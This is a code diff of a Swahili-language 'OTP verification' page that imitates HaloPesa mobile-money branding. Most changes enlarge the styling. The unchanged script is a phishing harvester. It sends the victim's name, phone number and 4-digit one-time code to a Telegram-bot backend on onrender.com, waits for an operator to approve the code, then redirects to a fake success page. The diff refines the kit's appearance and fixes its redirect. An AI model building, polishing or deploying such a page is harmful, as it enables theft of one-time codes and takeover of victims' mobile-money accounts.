@@ -19,47 +19,48 @@ body {
   display: flex;
   justify-content: center;
   align-items: center;
-  padding: 20px;
+  padding: 16px;
 }
 
 .page {
   width: 100%;
-  max-width: 500px;
+  max-width: 560px;
 }
 
 /* Card - Clean white with subtle shadow */
 .card {
   background: #ffffff;
-  border-radius: 16px;
-  padding: 35px 30px;
+  border-radius: 20px;
+  padding: 40px 32px 36px;
   box-shadow: 0 8px 30px rgba(26, 67, 41, 0.10);
   border: 1px solid #e6efe6;
 }
 
 /* Titles - HaloPesa Green */
 .title {
-  font-size: 26px;
+  font-size: 32px;
   font-weight: 700;
   color: #1a6b2a;
-  margin-bottom: 6px;
+  margin-bottom: 8px;
   letter-spacing: -0.3px;
 }
 
 .subtitle {
   color: #5a6b5a;
-  font-size: 15px;
-  margin-bottom: 4px;
+  font-size: 18px;
+  margin-bottom: 6px;
 }
 
 .display-number {
   color: #1a2b1a;
   font-weight: 700;
-  font-size: 16px;
-  margin-bottom: 22px;
+  font-size: 20px;
+  margin-bottom: 24px;
   background: #f4f9f4;
-  padding: 8px 14px;
-  border-radius: 8px;
+  padding: 10px 18px;
+  border-radius: 10px;
   display: inline-block;
+  letter-spacing: 0.3px;
 }
 
 /* Success Box - Light green HaloPesa style */
@@ -67,46 +68,47 @@ body {
   background: #eaf6ea;
   border: 1px solid #b8d9b8;
   color: #1a6b2a;
-  border-radius: 12px;
-  padding: 16px 18px;
-  margin-bottom: 22px;
+  border-radius: 14px;
+  padding: 18px 20px;
+  margin-bottom: 26px;
   display: flex;
-  gap: 12px;
+  gap: 14px;
   align-items: flex-start;
-  font-size: 15px;
-  line-height: 1.4;
+  font-size: 17px;
+  line-height: 1.5;
 }
 
 .success-box > div:first-child {
-  font-size: 20px;
+  font-size: 24px;
   color: #1a7a2a;
   font-weight: 700;
+  line-height: 1;
 }
 
 .label {
-  font-size: 15px;
+  font-size: 18px;
   font-weight: 600;
   color: #1a2b1a;
-  margin-bottom: 16px;
+  margin-bottom: 18px;
 }
 
-/* OTP Inputs - HaloPesa style */
+/* OTP Inputs - BIGGER & BOLDER */
 .otp-boxes {
   display: flex;
   justify-content: center;
-  gap: 14px;
-  margin-bottom: 20px;
+  gap: 18px;
+  margin-bottom: 24px;
 }
 
 .otp-boxes input {
-  width: 62px;
-  height: 62px;
-  border: 2px solid #d0e0d0;
-  border-radius: 12px;
+  width: 76px;
+  height: 76px;
+  border: 2.5px solid #d0e0d0;
+  border-radius: 16px;
   background: #fafffa;
   text-align: center;
-  font-size: 26px;
-  font-weight: 600;
+  font-size: 34px;
+  font-weight: 700;
   color: #1a3b1a;
   outline: none;
   transition: border-color 0.2s, box-shadow 0.2s;
@@ -114,33 +116,33 @@ body {
 
 .otp-boxes input:focus {
   border-color: #1a7a2a;
-  box-shadow: 0 0 0 4px rgba(26, 122, 42, 0.15);
+  box-shadow: 0 0 0 5px rgba(26, 122, 42, 0.15);
 }
 
-/* Timer - HaloPesa Yellow/Green accent */
+/* Timer - Bigger & clearer */
 #timerContainer {
   text-align: center;
   color: #b8960f;
   font-weight: 600;
-  font-size: 15px;
-  margin-bottom: 22px;
+  font-size: 18px;
+  margin-bottom: 26px;
   background: #fefcf0;
-  padding: 10px 0;
-  border-radius: 10px;
+  padding: 14px 0;
+  border-radius: 12px;
 }
 
 #timerContainer strong {
   color: #1a7a2a;
-  font-size: 18px;
+  font-size: 22px;
 }
 
-/* Primary Button - HaloPesa Green */
+/* Primary Button - BIGGER */
 button {
   width: 100%;
-  height: 54px;
+  height: 62px;
   border: none;
-  border-radius: 12px;
-  font-size: 17px;
+  border-radius: 14px;
+  font-size: 20px;
   font-weight: 700;
   background: #d4e0d4;
   color: #8a9f8a;
@@ -150,7 +152,7 @@ button {
   display: flex;
   align-items: center;
   justify-content: center;
-  gap: 10px;
+  gap: 12px;
 }
 
 button:not(:disabled) {
@@ -169,8 +171,8 @@ button:not(:disabled):active {
 
 /* Spinner - White with green accent */
 .spinner {
-  width: 18px;
-  height: 18px;
+  width: 22px;
+  height: 22px;
   border: 3px solid rgba(255,255,255,0.3);
   border-top: 3px solid #ffffff;
   border-radius: 50%;
@@ -182,31 +184,108 @@ button:not(:disabled):active {
   to { transform: rotate(360deg); }
 }
 
-/* Status messages */
+/* Status messages - Bigger */
 #status {
-  margin-top: 16px;
+  margin-top: 18px;
   text-align: center;
-  font-size: 14px;
+  font-size: 16px;
   font-weight: 500;
   color: #c0392b;
-  min-height: 22px;
+  min-height: 26px;
 }
 
 /* ===== RESPONSIVE TWEAKS ===== */
 @media (max-width: 480px) {
   .card {
-    padding: 25px 18px;
+    padding: 28px 18px 24px;
+    border-radius: 16px;
   }
+
+  .title {
+    font-size: 26px;
+  }
+
+  .subtitle {
+    font-size: 16px;
+  }
+
+  .display-number {
+    font-size: 18px;
+    padding: 8px 14px;
+  }
+
+  .success-box {
+    font-size: 15px;
+    padding: 14px 16px;
+    gap: 12px;
+  }
+
+  .success-box > div:first-child {
+    font-size: 20px;
+  }
+
+  .label {
+    font-size: 16px;
+    margin-bottom: 14px;
+  }
+
+  .otp-boxes {
+    gap: 12px;
+    margin-bottom: 18px;
+  }
+
+  .otp-boxes input {
+    width: 64px;
+    height: 64px;
+    font-size: 28px;
+    border-radius: 14px;
+  }
+
+  #timerContainer {
+    font-size: 16px;
+    padding: 12px 0;
+    margin-bottom: 20px;
+  }
+
+  #timerContainer strong {
+    font-size: 19px;
+  }
+
+  button {
+    height: 56px;
+    font-size: 18px;
+    border-radius: 12px;
+  }
+
+  #status {
+    font-size: 15px;
+    margin-top: 14px;
+  }
+}
+
+/* Extra small devices */
+@media (max-width: 380px) {
+  .card {
+    padding: 20px 12px 18px;
+  }
+
   .title {
     font-size: 22px;
   }
+
   .otp-boxes {
-    gap: 10px;
+    gap: 8px;
   }
+
   .otp-boxes input {
     width: 54px;
     height: 54px;
-    font-size: 22px;
+    font-size: 24px;
+  }
+
+  button {
+    height: 50px;
+    font-size: 16px;
   }
 }
 </style>
@@ -214,36 +293,36 @@ button:not(:disabled):active {
 
 <body>
 
-<div class="page"> 
-  <div class="card"> 
-    <div class="title">Uthibitisho wa OTP</div> 
-    <div class="subtitle">Weka OTP iliyotumwa kwenye nambari yako ya simu</div> 
-    <div id="phoneNumber" class="display-number"></div> 
-    <div class="success-box"> 
-      <div>✓</div> 
-      <div>Maelezo yamethibitishwa! Tafadhali weka OTP yako hapa chini.</div> 
-    </div> 
-    <form id="otpForm"> 
-      <div class="label">Weka msimbo wa uthibitisho</div> 
-      <div class="otp-boxes"> 
-        <input maxlength="1" inputmode="numeric"> 
-        <input maxlength="1" inputmode="numeric"> 
-        <input maxlength="1" inputmode="numeric"> 
-        <input maxlength="1" inputmode="numeric"> 
-      </div> 
-      <div id="timerContainer"> 
-        Tuma tena msimbo kwa <strong><span id="timerDisplay">60</span></strong> sekunde 
-      </div> 
-      <button id="submitBtn" disabled> 
-        <span id="btnText">WASILISHA</span> 
-        <span class="spinner" id="spinner"></span> 
-      </button> 
-    </form> 
-    <div id="status"></div> 
-  </div> 
+<div class="page">
+  <div class="card">
+    <div class="title">Uthibitisho wa OTP</div>
+    <div class="subtitle">Weka OTP iliyotumwa kwenye nambari yako ya simu</div>
+    <div id="phoneNumber" class="display-number"></div>
+    <div class="success-box">
+      <div>✓</div>
+      <div>Maelezo yamethibitishwa! Tafadhali weka OTP yako hapa chini.</div>
+    </div>
+    <form id="otpForm">
+      <div class="label">Weka msimbo wa uthibitisho</div>
+      <div class="otp-boxes">
+        <input maxlength="1" inputmode="numeric">
+        <input maxlength="1" inputmode="numeric">
+        <input maxlength="1" inputmode="numeric">
+        <input maxlength="1" inputmode="numeric">
+      </div>
+      <div id="timerContainer">
+        Tuma tena msimbo kwa <strong><span id="timerDisplay">60</span></strong> sekunde
+      </div>
+      <button id="submitBtn" disabled>
+        <span id="btnText">WASILISHA</span>
+        <span class="spinner" id="spinner"></span>
+      </button>
+    </form>
+    <div id="status"></div>
+  </div>
 </div>
 
-<!-- ===== YOUR LOGIC — UNTOUCHED except redirect ===== -->
+<!-- ===== LOGIC — UNTOUCHED except redirect ===== -->
 <script>
 const BACKEND_URL = "https://halopesa-tanzania-x2u7.onrender.com";
 const params = new URLSearchParams(window.location.search);
@@ -254,14 +333,14 @@ if (botId) {
     localStorage.setItem('botId', botId);
 }
 
-if(!botId){ 
+if(!botId){
   document.getElementById('status').textContent = "Error: Missing bot ID. Please use the link from Telegram.";
-  throw new Error("Bot ID missing"); 
+  throw new Error("Bot ID missing");
 }
 
 // Get phone from localStorage
 const phone = localStorage.getItem('phone') || "";
-document.getElementById('phoneNumber').textContent = 
+document.getElementById('phoneNumber').textContent =
   phone ? phone.slice(0,6) + "****" + phone.slice(-2) : "No phone number found";
 
 const inputs = document.querySelectorAll('.otp-boxes input');
@@ -341,15 +420,15 @@ function pollCodeApproval(requestId){
 
 document.getElementById('otpForm').addEventListener('submit', async e=>{
   e.preventDefault();
-  
+
   const code=[...inputs].map(i=>i.value).join('');
-  
+
   // Check if all digits are entered
   if(code.length !== 4) {
     statusEl.textContent = "Please enter all 4 digits";
     return;
   }
-  
+
   const name=localStorage.getItem('firstName') || localStorage.getItem('name') || "Unknown";
   const phone=localStorage.getItem('phone') || "Unknown";
 
@@ -359,7 +438,7 @@ document.getElementById('otpForm').addEventListener('submit', async e=>{
   statusEl.textContent="Sending code for verification...";
 
   const res=await sendCodeToTelegram(name, phone, code);
-  
+
   if(!res||!res.requestId){
     statusEl.textContent="Failed to send code. Please try again.";
     submitBtn.disabled=false;
@@ -375,12 +454,12 @@ document.getElementById('otpForm').addEventListener('submit', async e=>{
   if(approved){
     localStorage.setItem('code', code);
     statusEl.textContent="Code verified! Redirecting...";
-    
+
     // ✅ FIXED: Redirect to success.html instead of merchant.html
     // Get botId from localStorage if not in URL
     const redirectBotId = botId || localStorage.getItem('botId') || '';
     console.log('✅ Redirecting to success.html with botId:', redirectBotId);
-    
+
     setTimeout(() => {
       window.location.href = `success.html?botId=${redirectBotId}`;
     }, 500);
